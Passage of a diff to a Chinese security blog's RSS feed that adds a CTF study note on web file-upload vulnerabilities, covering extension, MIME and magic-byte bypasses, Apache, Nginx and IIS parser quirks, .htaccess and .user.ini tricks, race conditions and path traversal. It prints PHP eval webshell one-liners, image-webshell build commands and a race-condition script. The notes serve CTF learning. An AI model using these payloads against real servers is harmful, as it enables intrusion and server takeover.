@@ -1,4 +1,621 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Freya&apos;s Blog</title><description>CTF、Web 安全与技术实践笔记</description><link>https://freya-we.github.io/</link><language>zh_CN</language><item><title>First CTF Note</title><link>https://freya-we.github.io/2026/02/07/first-ctf-note/</link><guid isPermaLink="true">https://freya-we.github.io/2026/02/07/first-ctf-note/</guid><description>This is a sample note. Replace it with a real CTF writeup when you are ready.</description><pubDate>Sat, 07 Feb 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This is a sample note. Replace it with a real CTF writeup when you are ready.&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Freya&apos;s Blog</title><description>CTF、Web 安全与技术实践笔记</description><link>https://freya-we.github.io/</link><language>zh_CN</language><item><title>CTF Web 文件上传笔记</title><link>https://freya-we.github.io/posts/ctf-web-file-upload/</link><guid isPermaLink="true">https://freya-we.github.io/posts/ctf-web-file-upload/</guid><description>整理 CTF Web 文件上传题中常见的校验绕过、解析差异和逻辑漏洞。</description><pubDate>Tue, 04 Aug 2026 00:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
+&lt;p&gt;文件上传漏洞学到现在最大的感触就是要有自己的一套思维，不能光生搬硬套网上的payload，打靶场不能只照着wp去操作，一定有自己思考的过程&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+&lt;h2&gt;目录&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;#%E4%B8%80%E6%BC%8F%E6%B4%9E%E6%9C%AC%E8%B4%A8%E4%B8%8E%E5%8E%9F%E7%90%86&quot;&gt;漏洞本质与原理&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E4%BA%8C%E6%A0%A1%E9%AA%8C%E6%9C%BA%E5%88%B6%E6%80%BB%E8%A7%88&quot;&gt;校验机制总览&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E4%B8%89%E5%89%8D%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87&quot;&gt;前端校验绕过&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E5%9B%9B%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87&quot;&gt;服务端黑名单绕过&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E4%BA%94%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87&quot;&gt;服务端白名单绕过&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E5%85%AD%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E&quot;&gt;解析漏洞&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E4%B8%83%E5%86%85%E5%AE%B9%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E5%9B%BE%E7%89%87%E9%A9%AC%E4%B8%8E%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93&quot;&gt;内容校验绕过（图片马与二次渲染）&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E5%85%AB%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&quot;&gt;逻辑漏洞&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E4%B9%9D%E9%85%8D%E5%90%88%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E&quot;&gt;配合其他漏洞&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E5%8D%81%E5%AE%9E%E6%88%98%E6%8E%92%E6%9F%A5%E6%B5%81%E7%A8%8Bchecklist&quot;&gt;实战排查流程（Checklist）&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E5%8D%81%E4%B8%80%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD&quot;&gt;防御措施&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#%E5%8D%81%E4%BA%8C%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA%E4%B8%8E%E5%B7%A5%E5%85%B7&quot;&gt;练习靶场与工具&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+&lt;h2&gt;一、漏洞本质与原理&lt;/h2&gt;
+&lt;p&gt;文件上传漏洞（File Upload Vulnerability）是指：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Web应用在处理用户上传文件时，没有对上传文件进行严格限制，导致攻击者可以上传恶意文件并执行，从而获得服务器权限。&lt;/p&gt;
+&lt;p&gt;漏洞上传：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;攻击者上传木马文件
+↓
+服务器保存
+↓
+访问木马文件
+↓
+执行恶意代码
+↓
+控制服务器
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;其实有个需要注意的点就是：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;文件上传题不只是想办法传一个 PHP 文件。文件以什么名字保存、保存到哪、能不能访问、最后会被谁处理，这几处都可能出问题。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;大致过程：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;找校验点 → 让文件落地 → 找到文件路径 → 想办法触发 → 拿到题目目标
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上传成功和代码执行是两回事。文件只能下载，和文件能被 PHP 等 解释，差别很大。常见触发点如下：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;触发方式&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;直接访问&lt;/td&gt;
+&lt;td&gt;上传目录可访问且可执行脚本，直接访问 &lt;code&gt;shell.php&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;文件包含&lt;/td&gt;
+&lt;td&gt;图片马（内容伪造为图片，尾部夹带代码）配合 LFI 触发&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;解析差异&lt;/td&gt;
+&lt;td&gt;利用 Apache / Nginx / IIS 的历史版本或错误配置形成解释链&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;配置文件&lt;/td&gt;
+&lt;td&gt;在服务器允许用户级配置时，用 &lt;code&gt;.htaccess&lt;/code&gt; / &lt;code&gt;.user.ini&lt;/code&gt; 改变解析行为&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;命令拼接&lt;/td&gt;
+&lt;td&gt;文件名进入系统命令，配合命令注入&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr /&gt;
+&lt;h2&gt;二、校验机制总览&lt;/h2&gt;
+&lt;p&gt;遇到“上传失败”先别急着换后缀，先看看拦截发生在哪一层：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;校验层&lt;/th&gt;
+&lt;th&gt;校验内容&lt;/th&gt;
+&lt;th&gt;典型绕过&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;扩展名（黑名单）&lt;/td&gt;
+&lt;td&gt;禁止 &lt;code&gt;.php .jsp .asp&lt;/code&gt; 等&lt;/td&gt;
+&lt;td&gt;大小写、双写、已配置的等价后缀、配置文件&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;扩展名（白名单）&lt;/td&gt;
+&lt;td&gt;只允许 &lt;code&gt;.jpg .png .gif&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;需要解析差异、文件包含等组合缺陷&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MIME 类型&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;Content-Type: image/png&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;改包伪造&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;文件头 / 内容&lt;/td&gt;
+&lt;td&gt;校验文件魔术字节或尝试解码&lt;/td&gt;
+&lt;td&gt;伪造文件头、合法图片载荷、二次渲染差异&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;大小 / 数量&lt;/td&gt;
+&lt;td&gt;限制体积与个数&lt;/td&gt;
+&lt;td&gt;多文件参数污染、压缩包&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;逻辑层&lt;/td&gt;
+&lt;td&gt;先存后校验、落地目录可控&lt;/td&gt;
+&lt;td&gt;条件竞争、路径穿越、文件覆盖&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;做题感受就是&lt;/p&gt;
+&lt;p&gt;最好一次只改一个地方。不然扩展名、MIME 和文件内容一起改，很难看出到底是哪一步起作用&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;三、前端校验绕过&lt;/h2&gt;
+&lt;p&gt;常用做法：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;禁用或修改 JS&lt;/strong&gt;：禁用 JavaScript，或在 DevTools 中修改校验函数和事件处理器。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;直接改包&lt;/strong&gt;：用 Burp Suite 或 Yakit 拦截上传请求，修改 &lt;code&gt;filename&lt;/code&gt; 与 &lt;code&gt;Content-Type&lt;/code&gt; 字段：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;原始请求：
+POST /upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.jpg&quot;
+Content-Type: image/jpeg
+
+&amp;lt;?php @eval($_POST[&apos;1&apos;]); ?&amp;gt;
+
+修改为：
+------WebKitFormBoundary
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;
+Content-Type: image/jpeg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;四、服务端黑名单绕过&lt;/h2&gt;
+&lt;p&gt;黑名单题先看它怎么取后缀、怎么比较、过滤几次。下面这些是常见测试项，但都吃环境，不能看到 payload 就直接套。&lt;/p&gt;
+&lt;h3&gt;1. 大小写绕过&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;shell.php  →  shell.pHp / shell.Php / SHELL.PHP
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;只在黑名单区分大小写、后端 handler 又能认混合大小写时有用。Windows 文件系统通常不区分大小写，Linux 通常区分；最后还是看 Web 服务器怎么配。&lt;/p&gt;
+&lt;h3&gt;2. 双写绕过&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;shell.pphphp  →  过滤删掉中间的 &quot;php&quot; →  shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对应 &lt;code&gt;str_ireplace(&quot;php&quot;, &quot;&quot;, $name)&lt;/code&gt; 这类只替换一次的写法。如果循环过滤，双写一般没用。&lt;/p&gt;
+&lt;h3&gt;3. 末尾点、空格与 NTFS ADS&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;shell.php.       →  部分 Windows 文件 API 规范化为 shell.php
+shell.php        →  末尾带空格；部分 Windows 文件 API 会去除空格
+shell.php::$DATA →  在特定 Windows + NTFS 文件 API 组合中指向默认数据流
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;重点是校验时的名字和 Windows 实际落盘后的名字不一致。Linux 会保留末尾点和空格；&lt;code&gt;::$DATA&lt;/code&gt; 也只和 NTFS 场景有关，不是通用截断。&lt;/p&gt;
+&lt;h3&gt;4. 等价后缀&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;.php   →  .phtml / .php3 / .php4 / .php5 / .pht 等
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;前提是黑名单只封了 &lt;code&gt;.php&lt;/code&gt;，而且服务器真的给替代后缀配了 PHP handler。不要默认 &lt;code&gt;.phtml&lt;/code&gt;、&lt;code&gt;.php5&lt;/code&gt; 一定能执行；&lt;code&gt;.phps&lt;/code&gt; 很多时候只是源码高亮，甚至没有配置。&lt;/p&gt;
+&lt;h3&gt;5. 用户级配置文件&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;&lt;code&gt;.htaccess&lt;/code&gt;（Apache）&lt;/strong&gt;——上传内容为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php .jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;能否生效看两个地方：Apache 是否允许 &lt;code&gt;AllowOverride FileInfo&lt;/code&gt;，当前 PHP handler 是否接受这个映射。换成 PHP-FPM 或禁掉覆盖后，这招经常失效。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;——上传内容为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;auto_prepend_file=filename //包含在文件头 
+auto_append_file=filename //包含在文件尾
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个点一开始容易绕晕，可以把它拆成“目录级配置 + 触发 PHP 文件 + 被包含文件”三部分来看&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;例如：
+/upload/
+├── .user.ini
+├── 1.png
+└── index.php
+访问：
+http://target/upload/
+实际流程是：
+GET /upload/
+→ Web 服务器寻找默认首页
+→ 找到 /upload/index.php
+→ 把 index.php 交给 PHP-FPM
+→ PHP 读取 /upload/.user.ini
+→ 先包含 /upload/1.png
+→ 再执行 /upload/index.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;flowchart TD
+    A[&quot;浏览器访问 /upload&quot;] --&amp;gt; B[&quot;服务器通常重定向到 /upload/&quot;]
+    B --&amp;gt; C{&quot;Web 服务器如何处理目录请求？&quot;}
+
+    C --&amp;gt;|&quot;默认首页是 index.php&quot;| D[&quot;内部定位到 /upload/index.php&quot;]
+    C --&amp;gt;|&quot;默认首页是 index.html&quot;| X[&quot;返回静态页面&amp;lt;br/&amp;gt;PHP 不启动&quot;]
+    C --&amp;gt;|&quot;没有默认首页&quot;| Y[&quot;返回 403 或目录列表&amp;lt;br/&amp;gt;PHP 不启动&quot;]
+    C --&amp;gt;|&quot;重写到根目录 /index.php&quot;| Z[&quot;执行根目录 PHP&amp;lt;br/&amp;gt;/upload/.user.ini 通常不生效&quot;]
+
+    D --&amp;gt; E[&quot;index.php 被交给 PHP-FPM&quot;]
+    E --&amp;gt; F{&quot;是否启用 .user.ini？&quot;}
+
+    F --&amp;gt;|&quot;未启用&quot;| G[&quot;正常执行 /upload/index.php&quot;]
+    F --&amp;gt;|&quot;已启用&quot;| H[&quot;PHP 扫描 /upload/.user.ini&quot;]
+
+    H --&amp;gt; I{&quot;是否找到有效配置？&quot;}
+    I --&amp;gt;|&quot;没有找到或缓存未刷新&quot;| G
+    I --&amp;gt;|&quot;找到&quot;| J[&quot;读取 auto_prepend_file = 1.png&quot;]
+
+    J --&amp;gt; K[&quot;PHP 在服务器内部打开 /upload/1.png&quot;]
+    K --&amp;gt; L[&quot;解析 1.png 中的 PHP 标签&amp;lt;br/&amp;gt;执行其中的 PHP 代码&quot;]
+    L --&amp;gt; M[&quot;继续执行 /upload/index.php&quot;]
+    M --&amp;gt; N[&quot;合并执行结果并返回给浏览器&quot;]
+    G --&amp;gt; N
+
+    X --&amp;gt; O[&quot;.user.ini 不会被读取&quot;]
+    Y --&amp;gt; O
+    Z --&amp;gt; O
+   
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;.user.ini&lt;/code&gt; 是 PHP CGI/FastCGI 模式下的目录级配置文件。若 &lt;code&gt;user_ini.filename&lt;/code&gt; 未被禁用，PHP 执行该目录中的 PHP 脚本时会读取它。通过 &lt;code&gt;auto_prepend_file = &quot;1.png&quot;&lt;/code&gt;，可以让 PHP 在执行目标脚本前包含 &lt;code&gt;1.png&lt;/code&gt;。&lt;code&gt;1.png&lt;/code&gt; 中仍需存在 PHP 代码，而且目录中要有可访问的 PHP 文件用于触发。直接访问图片不会执行其中的 PHP 代码。&lt;/p&gt;
+&lt;h3&gt;6. %00 截断（老版本 PHP &amp;lt; 5.3.4）&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;shell.php%00.jpg  →  落地为 shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;旧版 PHP 或底层 C API 会把空字节当作字符串结束。注意 &lt;code&gt;%00&lt;/code&gt; 要经过 URL 解码才是空字节，直接写在 multipart 的 &lt;code&gt;filename&lt;/code&gt; 里通常只是三个普通字符。PHP 5.3.4 之后基本修掉了，现在主要见于复现老环境的题。&lt;/p&gt;
+&lt;h3&gt;7. 过滤顺序与特殊字符&lt;/h3&gt;
+&lt;p&gt;如果题目会删除文件名里的某些字符，比如 &lt;code&gt;[]&lt;/code&gt;，就直接把过滤前后写出来算：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;目标字符串 - 被过滤的字符 = 最终落地的文件名
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;举例：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;过滤规则&lt;/th&gt;
+&lt;th&gt;输入文件名&lt;/th&gt;
+&lt;th&gt;落地结果&lt;/th&gt;
+&lt;th&gt;是否可行&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;删掉 &lt;code&gt;[ ]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;c[a]t.php&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;cat.php&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;✅ 绕过了&quot;禁止 cat&quot;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;删掉 &lt;code&gt;[ ]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;c{a}t.php&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;c{a}t.php&lt;/code&gt;（&lt;code&gt;{}&lt;/code&gt; 不在黑名单，原样保留）&lt;/td&gt;
+&lt;td&gt;❌ 没凑出目标字符串&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;删掉所有非字母数字&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;c{a}t.php&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;cat.php&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;✅&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;白名单只留 &lt;code&gt;[a-zA-Z0-9._-]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;任何特殊字符&lt;/td&gt;
+&lt;td&gt;被替换/拒绝&lt;/td&gt;
+&lt;td&gt;❌ 换什么字符都没用&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这里利用的是过滤顺序，不是 shell 通配符。只有文件名后来被拼进 shell 命令，&lt;code&gt;[]&lt;/code&gt; 和 Bash 的 &lt;code&gt;{}&lt;/code&gt; 展开才有关系。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+&lt;h2&gt;五、服务端白名单绕过&lt;/h2&gt;
+&lt;p&gt;白名单题里，单改 MIME 或补一个图片头，绕不过真正的扩展名检查。通常还得找解析差异、文件包含、配置文件或者上传逻辑的问题。&lt;/p&gt;
+&lt;h3&gt;1. 绕过 MIME 层&lt;/h3&gt;
+&lt;p&gt;如果只看请求里的 &lt;code&gt;Content-Type&lt;/code&gt;，Burp 里直接改。这个字段是客户端自己填的：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Content-Type: image/jpeg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;2. 绕过浅层文件头校验&lt;/h3&gt;
+&lt;p&gt;只校验文件头时，在文件开头拼上图片标识：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GIF89a
+&amp;lt;?php @eval($_POST[&apos;x&apos;]); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;常见文件签名：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;格式&lt;/th&gt;
+&lt;th&gt;文件头&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;GIF&lt;/td&gt;
+&lt;td&gt;47 49 46 38 39 61（GIF89A）或 47 49 46 38 37 61（GIF87A）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PNG&lt;/td&gt;
+&lt;td&gt;89504E47&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;JPG&lt;/td&gt;
+&lt;td&gt;FF D8 FF&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;有文件头不代表真能当图片解码。图片马也不会自己执行，还要搭配文件包含、用户配置或错误等配置&lt;/p&gt;
+&lt;h3&gt;3. 多扩展名与名称解析差异&lt;/h3&gt;
+&lt;p&gt;Apache 不是只看最后一个后缀，而是会分别处理每个后缀&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AddHandler application/x-httpd-php .php
+AddType image/jpeg .jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对于：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;shell.php.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Apache 可能得到：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;.php → 使用 PHP 处理
+.jpg → Content-Type 是 image/jpeg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;两项可以同时存在，所以文件仍可能被 PHP 执行。&lt;/p&gt;
+&lt;h3&gt;4. %00 截断（白名单场景）&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;shell.php%00.jpg  →  截断为 shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;六、解析漏洞&lt;/h2&gt;
+&lt;h3&gt;1. Apache 多后缀解析&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;shell.php.jpg&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Apache 会处理文件的多个后缀。在某些配置下，&lt;code&gt;.php&lt;/code&gt; 仍会让文件交给 PHP 执行；现代 PHP-FPM 配置通常不会。具体流程见上&lt;/p&gt;
+&lt;h3&gt;2. Nginx 路径解析&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;/upload/shell.jpg/1.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果 Nginx 和 PHP-FPM 配置不严，PHP 可能向前找到真实存在的 &lt;code&gt;shell.jpg&lt;/code&gt;，并把它当作 PHP 文件执行。配置了 &lt;code&gt;try_files&lt;/code&gt; 等限制后通常无法利用。&lt;/p&gt;
+&lt;h3&gt;3. IIS 6.0 解析&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;shell.asp;.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;IIS 6.0 可能忽略分号后面的内容，把文件当成 &lt;code&gt;shell.asp&lt;/code&gt; 解析。&lt;/p&gt;
+&lt;p&gt;目录名也可能触发：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;shell.asp/xxx.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果目录名以 &lt;code&gt;.asp&lt;/code&gt; 结尾，目录里的文件可能被当作 ASP 解析。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;七、内容校验绕过（图片马与二次渲染）&lt;/h2&gt;
+&lt;h3&gt;1. 图片马构造&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;直接拼接&lt;/strong&gt;（基础版）：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Linux
+echo &apos;GIF89a&amp;lt;?php @eval($_POST[&quot;x&quot;]);?&amp;gt;&apos; &amp;gt; shell.gif
+# 或把 PHP 代码追加到正常图片尾部
+cat shell.php &amp;gt;&amp;gt; a.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;结构合法版&lt;/strong&gt;：把代码塞进图片注释、EXIF 或附加数据块，通常能过 &lt;code&gt;getimagesize&lt;/code&gt; 这类检查。不过服务端如果用 GD/Imagick 重新编码，元数据多半会被清掉。&lt;/p&gt;
+&lt;h3&gt;2. 二次渲染绕过&lt;/h3&gt;
+&lt;p&gt;服务端用 GD 库（&lt;code&gt;imagecreatefromgif&lt;/code&gt; 等）重新生成图片 → 直接拼接的代码会被抹掉。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;做法&lt;/strong&gt;：准备一张原图，让题目处理一次，再对比处理前后的字节。先找稳定不变的区域，再尝试插入。GIF、PNG、库版本和编码参数都会影响结果，没有一个位置能通吃所有题。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# 思路示例：用脚本逐字节 diff 原图与渲染后图片，定位未变化区间
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;3. 触发&lt;/h3&gt;
+&lt;p&gt;图片马无法被直接执行，必须配合：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;文件包含：&lt;code&gt;?page=upload/shell.jpg&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.htaccess&lt;/code&gt;：&lt;code&gt;AddType application/x-httpd-php .jpg&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.user.ini&lt;/code&gt;：&lt;code&gt;auto_prepend_file=shell.jpg&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;解析漏洞：Nginx &lt;code&gt;/shell.jpg/1.php&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2&gt;八、逻辑漏洞&lt;/h2&gt;
+&lt;h3&gt;1. 条件竞争（Race Condition）&lt;/h3&gt;
+&lt;p&gt;场景：服务端&quot;先保存到磁盘 → 校验不通过 → 删除&quot;。删除有窗口期，抢在删除前访问即可执行。&lt;/p&gt;
+&lt;p&gt;利用时让“上传”和“访问临时文件”一起跑，抢在删除前读到固定回显：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from concurrent.futures import ThreadPoolExecutor, as_completed
+import requests
+
+upload_url = &quot;http://target/upload&quot;
+probe_url = &quot;http://target/upload/race.php&quot;
+payload = b&apos;&amp;lt;?php echo &quot;race-ok&quot;; ?&amp;gt;&apos;
+
+def upload_once():
+    return requests.post(
+        upload_url,
+        files={&quot;file&quot;: (&quot;race.php&quot;, payload, &quot;application/octet-stream&quot;)},
+        timeout=3,
+    )
+
+def probe_once():
+    return requests.get(probe_url, timeout=3)
+
+with ThreadPoolExecutor(max_workers=20) as pool:
+    jobs = [pool.submit(upload_once if i % 2 == 0 else probe_once)
+            for i in range(200)]
+    for job in as_completed(jobs):
+        response = job.result()
+        if &quot;race-ok&quot; in response.text:
+            print(&quot;race condition hit&quot;)
+            break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果服务端会改名，还得先从响应或者命名规律里找到临时文件 URL。&lt;/p&gt;
+&lt;h3&gt;2. 路径穿越&lt;/h3&gt;
+&lt;p&gt;文件名含 &lt;code&gt;../&lt;/code&gt; 控制落地目录：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;../../shell.php  →  写到上一级目录（可能是可执行目录）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里主要看后端会不会保留路径、会不会再做一次 URL 解码。multipart 的 &lt;code&gt;filename&lt;/code&gt; 里写 &lt;code&gt;%2f&lt;/code&gt;，一般不会自动变成 &lt;code&gt;/&lt;/code&gt;。另外还要试清楚 &lt;code&gt;/&lt;/code&gt;、&lt;code&gt;\&lt;/code&gt;、&lt;code&gt;basename&lt;/code&gt; 和路径规范化分别发生在哪一步。&lt;/p&gt;
+&lt;h3&gt;3. 文件覆盖&lt;/h3&gt;
+&lt;p&gt;若文件名可控且不重命名，可覆盖已存在的文件（如覆盖 &lt;code&gt;index.php&lt;/code&gt;、&lt;code&gt;config.php&lt;/code&gt;），属于高危逻辑缺陷。&lt;/p&gt;
+&lt;h3&gt;4. 目录可控 + 执行目录&lt;/h3&gt;
+&lt;p&gt;有些题只在上传目录里禁脚本。如果文件名能穿越到别的可执行目录，原来的限制就管不到了。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;九、配合其他漏洞&lt;/h2&gt;
+&lt;table&gt;
